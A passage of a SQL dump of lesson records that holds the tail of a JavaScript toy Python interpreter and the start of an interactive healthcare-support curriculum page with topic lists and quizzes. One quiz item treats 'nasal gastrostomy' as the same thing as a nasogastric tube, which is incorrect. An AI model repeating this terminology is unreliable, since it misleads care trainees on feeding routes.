loop\n        const forMatch = line.match(/^for\\s+(\\w+)\\s+in\\s+(.+):$/);\n        if (forMatch) {\n          const loopVar = forMatch[1];\n          let iterExpr = forMatch[2].trim();\n          let iterable;\n          \n          // range()\n          const rangeMatch = iterExpr.match(/^range\\((.+)\\)$/);\n          if (rangeMatch) {\n            const args = rangeMatch[1].split('','').map(a => {\n              let v = evalExpr(a.trim());\n              return typeof v === ''number'' ? v : parseInt(v);\n            });\n            iterable = [];\n            const start = args.length > 1 ? args[0] : 0;\n            const end = args.length > 1 ? args[1] : args[0];\n            const step = args[2] || 1;\n            for (let j = start; j < end; j += step) iterable.push(j);\n          } else {\n            iterable = vars[iterExpr] || evalExpr(iterExpr);\n          }\n          \n          if (Array.isArray(iterable)) {\n            const bodyStart = idx + 1;\n            for (const item of iterable) {\n              vars[loopVar] = item;\n              processBlock(bodyStart, currentIndent + 4);\n            }\n          }\n          // Skip body\n          idx++;\n          while (idx < lines.length && (lines[idx].search(/\\S/) === -1 || lines[idx].search(/\\S/) > currentIndent)) idx++;\n          continue;\n        }\n        \n        // While loop\n        const whileMatch = line.match(/^while\\s+(.+):$/);\n        if (whileMatch) {\n          let safety = 0;\n          const bodyStart = idx + 1;\n          let bodyEnd = bodyStart;\n          while (bodyEnd < lines.length && (lines[bodyEnd].search(/\\S/) === -1 || lines[bodyEnd].search(/\\S/) > currentIndent)) bodyEnd++;\n          \n          while (safety < 1000) {\n            let cond = whileMatch[1];\n            for (const [k, v] of Object.entries(vars)) {\n              cond = cond.replace(new RegExp(''\\\\b'' + k + ''\\\\b'', ''g''), typeof v === ''string'' ? JSON.stringify(v) : v);\n            }\n            try { if (!eval(cond)) break; } catch(e) { break; }\n            processBlock(bodyStart, currentIndent + 4);\n            safety++;\n          }\n          idx = bodyEnd;\n          continue;\n        }\n        \n        // If/elif/else\n        const ifMatch = line.match(/^(if|elif)\\s+(.+):$/);\n        const elseMatch = line.match(/^else\\s*:$/);\n        if (ifMatch || elseMatch) {\n          // Collect all branches\n          let branches = [];\n          let bIdx = idx;\n          while (bIdx < lines.length) {\n            let bLine = lines[bIdx].trim();\n            const bIndent = lines[bIdx].search(/\\S/);\n            if (bIndent !== currentIndent && bLine !== '''') break;\n            \n            const bIf = bLine.match(/^(if|elif)\\s+(.+):$/);\n            const bElse = bLine.match(/^else\\s*:$/);\n            if (bIf || bElse) {\n              const bodyStart = bIdx + 1;\n              let bodyEnd = bodyStart;\n              while (bodyEnd < lines.length && (lines[bodyEnd].search(/\\S/) === -1 || lines[bodyEnd].search(/\\S/) > currentIndent)) bodyEnd++;\n              branches.push({ cond: bIf ? bIf[2] : null, bodyStart, bodyEnd });\n              bIdx = bodyEnd;\n            } else break;\n          }\n          \n          let executed = false;\n          for (const branch of branches) {\n            if (branch.cond === null) {\n              // else\n              if (!executed) processBlock(branch.bodyStart, currentIndent + 4);\n              executed = true;\n            } else {\n              let cond = branch.cond;\n              for (const [k, v] of Object.entries(vars)) {\n                cond = cond.replace(new RegExp(''\\\\b'' + k + ''\\\\b'', ''g''), typeof v === ''string'' ? JSON.stringify(v) : v);\n              }\n              try {\n                if (!executed && eval(cond)) {\n                  processBlock(branch.bodyStart, currentIndent + 4);\n                  executed = true;\n                }\n              } catch(e) {}\n            }\n          }\n          idx = branches.length > 0 ? branches[branches.length - 1].bodyEnd : idx + 1;\n          continue;\n        }\n        \n        idx++;\n      }\n      return idx;\n    }\n    \n    processBlock(0, 0);\n    outputEl.innerHTML = ''<span class="label">OUTPUT:</span><span class="success">'' + escapeHtml(output || ''(no output)'') + ''</span>'';\n  } catch (e) {\n    outputEl.innerHTML = ''<span class="label">OUTPUT:</span><span class="error">Error: '' + escapeHtml(e.message) + ''</span>'';\n  }\n  \n  // Award points for running code\n  if (!outputEl.dataset.scored) {\n    outputEl.dataset.scored = ''1'';\n    addScore(5, document.getElementById(editorId));\n  }\n}\n\nfunction escapeHtml(text) {\n  const d = document.createElement(''div'');\n  d.textContent = text;\n  return d.innerHTML;\n}\n\n// --- Type explorer ---\nfunction showType(type) {\n  document.querySelectorAll(''.type-detail'').forEach(d => d.classList.remove(''show''));\n  document.querySelectorAll(''.type-tag'').forEach(t => t.classList.remove(''active''));\n  document.getElementById(''type-'' + type).classList.add(''show'');\n  document.querySelector(''.type-tag[data-type="'' + type + ''"]'').classList.add(''active'');\n}\n\n// --- Hint toggle ---\nfunction toggleHint(id) {\n  const el = document.getElementById(id);\n  el.classList.toggle(''show'');\n}\n\n// --- Progress bar ---\nwindow.addEventListener(''scroll'', () => {\n  const h = document.documentElement.scrollHeight - window.innerHeight;\n  const pct = (window.scrollY / h) * 100;\n  document.getElementById(''progressBar'').style.width = pct + ''%'';\n});\n\n// --- Scroll reveal ---\nconst observer = new IntersectionObserver((entries) => {\n  entries.forEach(e => {\n    if (e.isIntersecting) e.target.classList.add(''visible'');\n  });\n}, { threshold: 0.1 });\ndocument.querySelectorAll(''.reveal'').forEach(el => observer.observe(el));\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 30, 'Published', 1, '2026-03-04 02:56:27', '2026-03-10 14:16:26', NULL, NULL);
INSERT INTO `wpcu_mtti_lessons` VALUES
(9, 28, NULL, 'Healthcare Interactive Lessons', '', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Healthcare Support Services – Interactive Lessons</title>\n<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=DM+Sans:wght@300;400;500;600&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">\n<style>\n  :root {\n    --teal: #0d7377;\n    --teal-light: #14a085;\n    --teal-pale: #e0f4f4;\n    --cream: #faf8f3;\n    --charcoal: #1a1f2e;\n    --slate: #3d4561;\n    --muted: #8891a8;\n    --gold: #c9a84c;\n    --red: #e74c3c;\n    --green: #27ae60;\n    --orange: #e67e22;\n    --shadow: 0 4px 32px rgba(13,115,119,0.10);\n    --radius: 16px;\n  }\n  * { box-sizing: border-box; margin: 0; padding: 0; }\n  body {\n    background: var(--cream);\n    font-family: ''DM Sans'', sans-serif;\n    color: var(--charcoal);\n    min-height: 100vh;\n  }\n\n  /* NAV */\n  nav {\n    background: var(--charcoal);\n    padding: 0 32px;\n    display: flex;\n    align-items: center;\n    gap: 16px;\n    height: 64px;\n    position: sticky; top: 0; z-index: 100;\n    box-shadow: 0 2px 16px rgba(0,0,0,0.18);\n  }\n  nav .logo {\n    font-family: ''Playfair Display'', serif;\n    font-size: 1.2rem;\n    color: #fff;\n    font-weight: 700;\n    letter-spacing: 0.5px;\n    flex: 1;\n  }\n  nav .logo span { color: var(--teal-light); }\n  .nav-meta { color: var(--muted); font-size: 0.78rem; }\n\n  /* HOME */\n  #home {\n    display: block;\n  }\n  .hero {\n    background: linear-gradient(135deg, var(--charcoal) 0%, #1a3a4a 60%, var(--teal) 100%);\n    color: #fff;\n    padding: 72px 48px 80px;\n    position: relative;\n    overflow: hidden;\n  }\n  .hero::before {\n    content: '''';\n    position: absolute;\n    top: -80px; right: -80px;\n    width: 400px; height: 400px;\n    border-radius: 50%;\n    background: rgba(20, 160, 133, 0.12);\n    pointer-events: none;\n  }\n  .hero::after {\n    content: '''';\n    position: absolute;\n    bottom: -60px; left: -60px;\n    width: 250px; height: 250px;\n    border-radius: 50%;\n    background: rgba(201, 168, 76, 0.08);\n    pointer-events: none;\n  }\n  .hero-label {\n    display: inline-block;\n    background: rgba(201,168,76,0.18);\n    color: var(--gold);\n    border: 1px solid rgba(201,168,76,0.35);\n    font-family: ''DM Mono'', monospace;\n    font-size: 0.72rem;\n    letter-spacing: 2px;\n    text-transform: uppercase;\n    padding: 4px 14px;\n    border-radius: 99px;\n    margin-bottom: 20px;\n  }\n  .hero h1 {\n    font-family: ''Playfair Display'', serif;\n    font-size: clamp(2rem, 4vw, 3.4rem);\n    font-weight: 900;\n    line-height: 1.12;\n    max-width: 680px;\n    margin-bottom: 16px;\n  }\n  .hero p {\n    color: rgba(255,255,255,0.7);\n    font-size: 1.05rem;\n    max-width: 560px;\n    line-height: 1.7;\n    margin-bottom: 32px;\n  }\n  .hero-stats {\n    display: flex; gap: 40px; flex-wrap: wrap;\n  }\n  .stat { text-align: left; }\n  .stat .num {\n    font-family: ''Playfair Display'', serif;\n    font-size: 2rem;\n    font-weight: 700;\n    color: var(--teal-light);\n    line-height: 1;\n  }\n  .stat .label {\n    font-size: 0.78rem;\n    color: rgba(255,255,255,0.5);\n    text-transform: uppercase;\n    letter-spacing: 1px;\n    margin-top: 2px;\n  }\n\n  /* MODULE TABS */\n  .module-tabs {\n    display: flex;\n    gap: 0;\n    padding: 0 32px;\n    background: var(--charcoal);\n    border-top: 1px solid rgba(255,255,255,0.06);\n    overflow-x: auto;\n  }\n  .module-tab {\n    padding: 14px 24px;\n    font-size: 0.83rem;\n    font-weight: 600;\n    color: rgba(255,255,255,0.45);\n    cursor: pointer;\n    border-bottom: 3px solid transparent;\n    transition: all .2s;\n    white-space: nowrap;\n    letter-spacing: 0.3px;\n    background: none;\n    border-top: none; border-left: none; border-right: none;\n    font-family: ''DM Sans'', sans-serif;\n  }\n  .module-tab:hover { color: rgba(255,255,255,0.8); }\n  .module-tab.active { color: var(--teal-light); border-bottom-color: var(--teal-light); }\n\n  /* CARDS GRID */\n  .cards-section {\n    padding: 40px 32px;\n    display: none;\n  }\n  .cards-section.active { display: block; }\n  .section-title {\n    font-family: ''Playfair Display'', serif;\n    font-size: 1.5rem;\n    font-weight: 700;\n    color: var(--charcoal);\n    margin-bottom: 8px;\n  }\n  .section-subtitle {\n    color: var(--muted);\n    font-size: 0.88rem;\n    margin-bottom: 28px;\n  }\n  .cards-grid {\n    display: grid;\n    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));\n    gap: 20px;\n  }\n  .unit-card {\n    background: #fff;\n    border-radius: var(--radius);\n    border: 1.5px solid rgba(13,115,119,0.10);\n    padding: 28px;\n    cursor: pointer;\n    transition: all .25s;\n    position: relative;\n    overflow: hidden;\n  }\n  .unit-card::before {\n    content: '''';\n    position: absolute;\n    top: 0; left: 0; right: 0;\n    height: 4px;\n    background: var(--teal);\n  }\n  .unit-card:hover {\n    border-color: var(--teal);\n    box-shadow: var(--shadow);\n    transform: translateY(-3px);\n  }\n  .unit-code {\n    font-family: ''DM Mono'', monospace;\n    font-size: 0.7rem;\n    color: var(--muted);\n    letter-spacing: 1px;\n    text-transform: uppercase;\n    margin-bottom: 10px;\n  }\n  .unit-card h3 {\n    font-family: ''Playfair Display'', serif;\n    font-size: 1.12rem;\n    font-weight: 700;\n    color: var(--charcoal);\n    margin-bottom: 10px;\n    line-height: 1.3;\n  }\n  .unit-card p {\n    font-size: 0.83rem;\n    color: var(--slate);\n    line-height: 1.6;\n    margin-bottom: 18px;\n  }\n  .card-meta {\n    display: flex; gap: 12px; align-items: center;\n    flex-wrap: wrap;\n  }\n  .badge {\n    display: inline-flex;\n    align-items: center;\n    gap: 5px;\n    padding: 4px 10px;\n    border-radius: 99px;\n    font-size: 0.74rem;\n    font-weight: 600;\n  }\n  .badge.hours { background: var(--teal-pale); color: var(--teal); }\n  .badge.outcomes { background: #eef2ff; color: #4a5fdb; }\n  .btn-start {\n    margin-left: auto;\n    background: var(--teal);\n    color: #fff;\n    border: none;\n    padding: 8px 18px;\n    border-radius: 99px;\n    font-size: 0.8rem;\n    font-weight: 600;\n    cursor: pointer;\n    font-family: ''DM Sans'', sans-serif;\n    transition: background .2s;\n  }\n  .btn-start:hover { background: var(--teal-light); }\n\n  /* LESSON VIEW */\n  #lesson-view {\n    display: none;\n    padding: 32px;\n    max-width: 900px;\n    margin: 0 auto;\n  }\n  #lesson-view.active { display: block; }\n  .lesson-back {\n    display: inline-flex;\n    align-items: center;\n    gap: 8px;\n    color: var(--teal);\n    font-weight: 600;\n    font-size: 0.88rem;\n    cursor: pointer;\n    margin-bottom: 24px;\n    background: none;\n    border: none;\n    font-family: ''DM Sans'', sans-serif;\n    padding: 0;\n  }\n  .lesson-header {\n    background: linear-gradient(135deg, var(--charcoal), #1d3557);\n    border-radius: var(--radius);\n    padding: 36px;\n    color: #fff;\n    margin-bottom: 28px;\n    position: relative;\n    overflow: hidden;\n  }\n  .lesson-header::after {\n    content: '''';\n    position: absolute;\n    right: -40px; bottom: -40px;\n    width: 200px; height: 200px;\n    border-radius: 50%;\n    background: rgba(20,160,133,0.12);\n  }\n  .lesson-header .unit-code { color: var(--gold); margin-bottom: 8px; }\n  .lesson-header h2 {\n    font-family: ''Playfair Display'', serif;\n    font-size: 1.9rem;\n    font-weight: 900;\n    margin-bottom: 10px;\n  }\n  .lesson-header p { color: rgba(255,255,255,0.65); font-size: 0.92rem; line-height: 1.65; }\n  .lesson-meta-row {\n    display: flex; gap: 16px; margin-top: 16px; flex-wrap: wrap;\n  }\n  .lesson-meta-row .badge { background: rgba(255,255,255,0.1); color: #fff; }\n\n  /* OUTCOMES NAV */\n  .outcomes-nav {\n    display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 24px;\n  }\n  .outcome-btn {\n    padding: 8px 18px;\n    border-radius: 99px;\n    border: 1.5px solid var(--teal-pale);\n    background: #fff;\n    color: var(--slate);\n    font-size: 0.8rem;\n    font-weight: 600;\n    cursor: pointer;\n    transition: all .2s;\n    font-family: ''DM Sans'', sans-serif;\n  }\n  .outcome-btn.active, .outcome-btn:hover {\n    background: var(--teal);\n    border-color: var(--teal);\n    color: #fff;\n  }\n\n  /* LESSON PANEL */\n  .lesson-panel {\n    display: none;\n    animation: fadeUp .3s ease;\n  }\n  .lesson-panel.active { display: block; }\n  @keyframes fadeUp {\n    from { opacity: 0; transform: translateY(12px); }\n    to { opacity: 1; transform: translateY(0); }\n  }\n\n  .content-card {\n    background: #fff;\n    border-radius: var(--radius);\n    padding: 32px;\n    margin-bottom: 20px;\n    border: 1.5px solid rgba(0,0,0,0.06);\n  }\n  .content-card h3 {\n    font-family: ''Playfair Display'', serif;\n    font-size: 1.2rem;\n    color: var(--charcoal);\n    margin-bottom: 14px;\n    display: flex; align-items: center; gap: 10px;\n  }\n  .content-card h3 .icon {\n    width: 32px; height: 32px;\n    background: var(--teal-pale);\n    border-radius: 8px;\n    display: flex; align-items: center; justify-content: center;\n    font-size: 1rem;\n    flex-shrink: 0;\n  }\n  .topic-list {\n    list-style: none;\n    display: flex; flex-direction: column; gap: 8px;\n  }\n  .topic-list li {\n    display: flex; align-items: flex-start; gap: 10px;\n    font-size: 0.88rem;\n    color: var(--slate);\n    line-height: 1.5;\n    padding: 10px 14px;\n    background: var(--cream);\n    border-radius: 10px;\n    border-left: 3px solid var(--teal);\n  }\n  .topic-list li::before { content: ''▸''; color: var(--teal); flex-shrink: 0; font-size: 0.8rem; margin-top: 1px; }\n\n  /* QUIZ */\n  .quiz-card {\n    background: #fff;\n    border-radius: var(--radius);\n    padding: 32px;\n    border: 1.5px solid rgba(0,0,0,0.06);\n    margin-bottom: 20px;\n  }\n  .quiz-card h3 {\n    font-family: ''Playfair Display'', serif;\n    font-size: 1.1rem;\n    color: var(--charcoal);\n    margin-bottom: 20px;\n    padding-bottom: 14px;\n    border-bottom: 1px solid rgba(0,0,0,0.06);\n  }\n  .question-block { margin-bottom: 28px; }\n  .question-text {\n    font-size: 0.92rem;\n    font-weight: 600;\n    color: var(--charcoal);\n    margin-bottom: 12px;\n    line-height: 1.5;\n  }\n  .options { display: flex; flex-direction: column; gap: 8px; }\n  .option-btn {\n    display: flex; align-items: center; gap: 12px;\n    padding: 12px 16px;\n    border-radius: 10px;\n    border: 1.5px solid rgba(0,0,0,0.10);\n    background: #fff;\n    cursor: pointer;\n    font-size: 0.85rem;\n    color: var(--slate);\n    text-align: left;\n    transition: all .18s;\n    font-family: ''DM Sans'', sans-serif;\n    width: 100%;\n  }\n  .option-btn:hover { border-color: var(--teal); background: var(--teal-pale); }\n  .option-btn.correct { background: #d4f5e2; border-color: var(--green); color: #1a6632; }\n  .option-btn.wrong { background: #fde8e8; border-color: var(--red); color: #7a1919; }\n  .option-btn.disabled { cursor: default; pointer-events: none; }\n  .option-letter {\n    width: 26px; height: 26px;\n    background: rgba(0,0,0,0.06);\n    border-radius: 6px;\n    display: flex; align-items: center; justify-content: center;\n    font-weight: 700;\n    font-size: 0.78rem;\n    flex-shrink: 0;\n  }\n  .feedback {\n    display: none;\n    padding: 10px 14px;\n    border-radius: 8px;\n    font-size: 0.82rem;\n    font-weight: 500;\n    margin-top: 8px;\n  }\n  .feedback.show { display: block; }\n  .feedback.correct { background: #d4f5e2; color: #1a6632; }\n  .feedback.wrong { background: #fde8e8; color: #7a1919; }\n\n  /* ASSESSMENT METHODS */\n  .methods-grid {\n    display: grid;\n    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));\n    gap: 10px;\n  }\n  .method-chip {\n    background: var(--teal-pale);\n    color: var(--teal);\n    border-radius: 10px;\n    padding: 10px 14px;\n    font-size: 0.8rem;\n    font-weight: 600;\n    text-align: center;\n    border: 1px solid rgba(13,115,119,0.15);\n  }\n\n  /* PROGRESS */\n  .progress-bar-wrap {\n    background: rgba(0,0,0,0.06);\n    border-radius: 99px;\n    height: 6px;\n    margin-bottom: 20px;\n    overflow: hidden;\n  }\n  .progress-bar {\n    background: linear-gradient(90deg, var(--teal), var(--teal-light));\n    height: 100%;\n    border-radius: 99px;\n    transition: width .4s;\n  }\n\n  /* SCORE BANNER */\n  .score-banner {\n    background: linear-gradient(135deg, var(--teal), var(--teal-light));\n    color: #fff;\n    border-radius: var(--radius);\n    padding: 24px 28px;\n    display: none;\n    align-items: center;\n    gap: 20px;\n    margin-bottom: 20px;\n  }\n  .score-banner.show { display: flex; }\n  .score-num {\n    font-family: ''Playfair Display'', serif;\n    font-size: 2.8rem;\n    font-weight: 900;\n    line-height: 1;\n  }\n  .score-text { font-size: 0.9rem; opacity: 0.85; line-height: 1.5; }\n\n  /* RESPONSIVE */\n  @media (max-width: 600px) {\n    .hero { padding: 48px 20px 56px; }\n    .cards-section, #lesson-view { padding: 20px; }\n    .module-tabs { padding: 0 16px; }\n    nav { padding: 0 16px; }\n    .lesson-header { padding: 24px; }\n    .content-card, .quiz-card { padding: 20px; }\n    .hero h1 { font-size: 1.8rem; }\n  }\n</style>\n</head>\n<body>\n\n<nav>\n  <div class="logo">Health<span>Care</span> Support Services</div>\n  <span class="nav-meta">KNQF Level 5 · TVET CDACC</span>\n</nav>\n\n<!-- HOME -->\n<div id="home">\n  <div class="hero">\n    <div class="hero-label">Interactive Learning Platform</div>\n    <h1>Healthcare Support Services Curriculum</h1>\n    <p>Explore all four modules and their units. Study content, review learning outcomes, and test your knowledge with interactive quizzes.</p>\n    <div class="hero-stats">\n      <div class="stat"><div class="num">20</div><div class="label">Units of Learning</div></div>\n      <div class="stat"><div class="num">1,760</div><div class="label">Total Hours</div></div>\n      <div class="stat"><div class="num">4</div><div class="label">Modules</div></div>\n      <div class="stat"><div class="num">176</div><div class="label">Credit Factors</div></div>\n    </div>\n  </div>\n\n  <div class="module-tabs">\n    <button class="module-tab active" onclick="showModule(0)">Module I – Homecare</button>\n    <button class="module-tab" onclick="showModule(1)">Module II – Caregiving</button>\n    <button class="module-tab" onclick="showModule(2)">Module III – Clinical Support</button>\n    <button class="module-tab" onclick="showModule(3)">Module IV – Professional Skills</button>\n  </div>\n\n  <!-- MODULE I -->\n  <div class="cards-section active" id="mod0">\n    <div class="section-title">Module I — Homecare Services</div>\n    <div class="section-subtitle">Core competencies for providing home-based health and personal support services · 230 hours · 23 credits</div>\n    <div class="cards-grid" id="mod0-cards"></div>\n  </div>\n  <!-- MODULE II -->\n  <div class="cards-section" id="mod1">\n    <div class="section-title">Module II — Caregiving Services</div>\n    <div class="section-subtitle">First aid, catering and special needs support competencies · 380 hours · 38 credits</div>\n    <div class="cards-grid" id="mod1-cards"></div>\n  </div>\n  <!-- MODULE III -->\n  <div class="cards-section" id="mod2">\n    <div class="section-title">Module III — Clinical Support Skills</div>\n    <div class="section-subtitle">Health science foundations, digital skills and infection control · 460 hours · 46 credits</div>\n    <div class="cards-grid" id="mod2-cards"></div>\n  </div>\n  <!-- MODULE IV -->\n  <div class="cards-section" id="mod3">\n    <div class="section-title">Module IV — Professional Practice</div>\n    <div class="section-subtitle">Ethics, entrepreneurship, patient care and facility procedures · 920 hours · 92 credits</div>\n    <div class="cards-grid" id="mod3-cards"></div>\n  </div>\n</div>\n\n<!-- LESSON VIEW -->\n<div id="lesson-view">\n  <button class="lesson-back" onclick="goHome()">← Back to Units</button>\n  <div id="lesson-content"></div>\n</div>\n\n<script>\nconst units = [\n  // MODULE I\n  {\n    module: 0,\n    code: "HW/CU/HBC/CR/01/3/MA",\n    title: "House Keeping Services",\n    hours: 60, credits: 6,\n    desc: "Maintain a safe, clean and comfortable care environment through cleaning, bed-making and laundry services.",\n    outcomes: [\n      {\n        title: "Perform Cleaning Service",\n        hours: 15,\n        topics: [\n          "Cleaning equipment and materials: mops, squeezers, scrubbers, brooms, vacuum cleaners",\n          "Cleaning procedures: sweeping, mopping, scrubbing, dusting, disinfecting",\n          "Cleaning checklists: routine, deep-clean, end-of-shift schedules",\n          "Proper use and storage of chemical cleaning agents",\n          "Infection control principles during cleaning"\n        ],\n        methods: ["Practical","Oral Questioning","Third-party Report","Written Test"],\n        quiz: [\n          { q:"Which piece of equipment is used to collect dirty mop water?", opts:["Squeezers","Dusters","Scrubbers","Cobweb remover"], ans:0, exp:"A squeezer (wringer) removes excess water from mops and is used alongside mop buckets." },\n          { q:"Why must cleaning chemicals be stored separately from patient food items?", opts:["They look similar","To prevent accidental poisoning and contamination","They are too heavy","No specific reason"], ans:1, exp:"Chemicals stored with food risk cross-contamination and accidental ingestion, which is a serious safety hazard." },\n          { q:"What does a cleaning checklist help ensure?", opts:["Decorative purposes","All cleaning tasks are systematically completed","Staff take longer breaks","Equipment is purchased"], ans:1, exp:"Checklists ensure no area is missed and provide accountability records for cleaning standards." }\n        ]\n      },\n      {\n        title: "Perform Bed Making",\n        hours: 15,\n        topics: [\n          "Types of beds: unoccupied bed, occupied bed, post-operative bed",\n          "Bed making procedure: linen removal, mattress turning, layering sheets",\n          "Decorating guest/patient beds for comfort and dignity",\n          "Infection control: handling soiled linen safely",\n          "Ergonomics: correct posture when making beds to prevent injury"\n        ],\n        methods: ["Practical","Oral Questioning","Written Tests","Third-party Report"],\n        quiz: [\n          { q:"What type of bed is prepared before a post-surgery patient returns from theatre?", opts:["Occupied bed","Unoccupied bed","Post-operative bed","Soiled bed"], ans:2, exp:"A post-operative bed is specifically prepared to receive a patient returning from surgery, with easy access from both sides." },\n          { q:"How should soiled linen be handled to prevent infection spread?", opts:["Shaken to remove debris","Rolled tightly and placed in a linen bag without shaking","Left on the floor","Washed by hand immediately"], ans:1, exp:"Soiled linen should be rolled without shaking to prevent airborne spread of microorganisms and placed in appropriate linen bags." },\n          { q:"Why is ergonomics important when making beds?", opts:["To make beds look nicer","To prevent back injuries in care staff","To save time","To entertain patients"], ans:1, exp:"Correct posture and techniques prevent musculoskeletal injuries which are common in healthcare workers during manual tasks." }\n        ]\n      },\n      {\n        title: "Launder Articles and Fabrics",\n        hours: 30,\n        topics: [\n          "Laundry equipment: automated washing machines, tumble dryers, calendars",\n          "Pre-laundry activities: sorting, checking pockets, stain treatment",\n          "Laundry procedures: wash cycles, temperatures for different fabrics",\n          "Finishing: steam press, iron boxes, ironing boards",\n          "Linen control sheets and storage procedures"\n        ],\n        methods: ["Practical","Oral Questioning","Third-party Report","Written Test"],\n        quiz: [\n          { q:"What is the purpose of sorting linen before laundering?", opts:["To count items only","To separate colours/fabrics/soiling levels for appropriate wash cycles","To delay washing","For decoration"], ans:1, exp:"Sorting prevents colour bleeding, ensures correct wash temperatures and protects delicate fabrics while ensuring heavily soiled items are treated appropriately." },\n          { q:"Which finishing equipment applies steam to remove creases from large flat linen?", opts:["Iron box","Tumble dryer","Calendar/steam press","Washing machine"], ans:2, exp:"A calendar (rotary iron/steam press) is used for large flat items like sheets and pillowcases in institutional laundry settings." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 0,\n    code: "HW/CU/HBC/CR/02/3/MA",\n    title: "Client''s Dietary Interventions",\n    hours: 50, credits: 5,\n    desc: "Establish patient dietary needs, plan individualised feeding care and conduct ongoing dietary monitoring.",\n    outcomes: [\n      {\n        title: "Establish Patient Dietary Needs",\n        hours: 12,\n        topics: [\n          "Dietary assessment tools: 24-hour recall, food frequency questionnaire, food record profiles",\n          "Special dietary needs: diabetic, ketogenic, low-carb, vegetarian, lactose intolerance",\n          "Routes of feeding: oral vs tube feeding (nasal gastrostomy, gastrostomy tube)",\n          "Blood level monitoring: electrolytes, glucose, protein markers",\n          "Role of family members in dietary history"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests","Oral Assessment"],\n        quiz: [\n          { q:"Which dietary assessment tool asks a patient to recall everything eaten in the past 24 hours?", opts:["Food frequency questionnaire","24-hour dietary recall","Screener''s profile","Food record profile"], ans:1, exp:"The 24-hour dietary recall is a structured interview asking patients to recall all foods and beverages consumed in the previous 24 hours." },\n          { q:"A patient with Type 1 diabetes requires which specialised diet?", opts:["High sugar diet","Ketogenic only","Diabetic diet with controlled carbohydrate intake","Vegetarian diet"], ans:2, exp:"Diabetic patients require controlled carbohydrate intake, regular meal timing and monitoring of blood glucose responses to foods." },\n          { q:"What does ''nasal gastrostomy'' refer to as a route of feeding?", opts:["Feeding by mouth","A tube passed through the nose into the stomach","An injection of nutrients","Intravenous feeding"], ans:1, exp:"A nasogastric (nasal gastrostomy) tube is inserted through the nose, down the oesophagus, into the stomach for tube feeding." }\n        ]\n      },\n      {\n        title: "Draw Individualised Feeding Care Plan",\n        hours: 12,\n        topics: [\n          "Meaning and purpose of an individualised feeding care plan",\n          "Types of feeding care plans: therapeutic, preventive, rehabilitative",\n          "Creating grocery lists aligned to patient needs",\n          "Developing recipes meeting nutritional targets",\n          "Menu planning considering cultural preferences and restrictions"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests"],\n        quiz: [\n          { q:"Why must a feeding care plan be ''individualised''?", opts:["For aesthetic reasons","Each patient has unique nutritional needs, health conditions and preferences","All patients eat the same","It is a legal requirement only"], ans:1, exp:"Individualisation ensures the plan addresses the specific health conditions, cultural background, preferences and nutritional deficiencies of each patient." },\n          { q:"What document lists the specific food items to purchase for a patient''s meal plan?", opts:["Medical prescription","Grocery list","Discharge summary","Admission form"], ans:1, exp:"A grocery list aligned to the care plan ensures the right foods are available to prepare the prescribed meals for the patient." }\n        ]\n      },\n      {\n        title: "Carry Out Feeding Care Plan Interventions",\n        hours: 16,\n        topics: [\n          "Client diet counselling: explaining food choices and portion sizes",\n          "Safe food handling: hygiene, storage temperatures, cross-contamination prevention",\n          "Honouring patient cultural practices and dietary preferences",\n          "Feeding tools: plates, cups, adapted utensils for special needs patients",\n          "Cleaning feeding tools after use: sanitisation procedures"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests","Oral Assessment"],\n        quiz: [\n          { q:"What temperature should hot food be held at to prevent bacterial growth?", opts:["Above 63°C (145°F)","Room temperature","Below 15°C","Any temperature"], ans:0, exp:"Hot food must be held above 63°C to remain in the safe temperature zone that inhibits bacterial growth." },\n          { q:"Why should a patient''s cultural food practices be considered in meal planning?", opts:["It is not important","To ensure compliance, dignity and respect for the patient","Only for international patients","For administrative convenience"], ans:1, exp:"Respecting cultural practices improves patient satisfaction, compliance with the feeding plan and maintains the patient''s dignity." }\n        ]\n      },\n      {\n        title: "Conduct Continuous Dietary Monitoring",\n        hours: 10,\n        topics: [\n          "Monitoring indicators: nausea, vomiting, diarrhoea, tolerance levels",\n          "Reassessment triggers and when to adjust the care plan",\n          "Documentation formats: recording food intake, tolerance and weight changes",\n          "Referral pathways to dietitians and medical professionals",\n          "Report dissemination to the care team"\n        ],\n        methods: ["Practical Assessment","Projects","Portfolio of Evidence","Written Tests","Oral Assessment"],\n        quiz: [\n          { q:"A patient on tube feeding develops diarrhoea. What is the FIRST appropriate action?", opts:["Ignore it","Increase feed rate","Document, report to supervising clinician and reassess the feeding plan","Stop all feeding permanently"], ans:2, exp:"Diarrhoea may indicate feed intolerance. Document the finding, report to the supervising clinician for reassessment, and the plan may need adjustment." },\n          { q:"What type of professional should a patient be referred to if their nutritional needs exceed the HSS scope of practice?", opts:["A social worker","A physiotherapist","A dietitian or nutritionist","An engineer"], ans:2, exp:"Complex nutritional management beyond the Healthcare Support Assistant''s scope requires referral to a qualified dietitian or nutritionist." }\n        ]\n      }\n    ]\n  },\n  {\n    module: 0,\n    code: "HW/CU/HBC/CR/03/3/MA",\n    title: "Psychosocial Care",\n    hours: 70, credits: 7,\n    desc: "Assess emotional and social needs, provide psychosocial support interventions, and conduct self-care practices.",\n    outcomes: [\n      {\n        title: "Assess Emotional and Social Needs",\n        hours: 20,\n        topics: [\n          "Emotional needs: depression, anxiety, fear, pain, stress identification",\n          "Assessment tools: active listening, oral questioning, observation techniques",\n          "Cognitive and communication challenges in patients",\n          "Cultural, social and environmental factors affecting wellbeing",\n          "Mental health and psychological factors to screen for"\n        ],\n        methods: ["Case Studies","Observation","Written Tests","Assignments","Simulation"],\n        quiz: [\n          { q:"Which technique involves giving full attention to what a patient says, both verbally and non-verbally, without interrupting?", opts:["Oral questioning","Active listening","Writing notes","Referral"], ans:1, exp:"Active listening means giving complete attention, reflecting back, and showing empathy — it is fundamental to psychosocial assessment." },\n          { q:"A patient refuses to eat, stays isolated and cries frequently. Which emotional state might this suggest?", 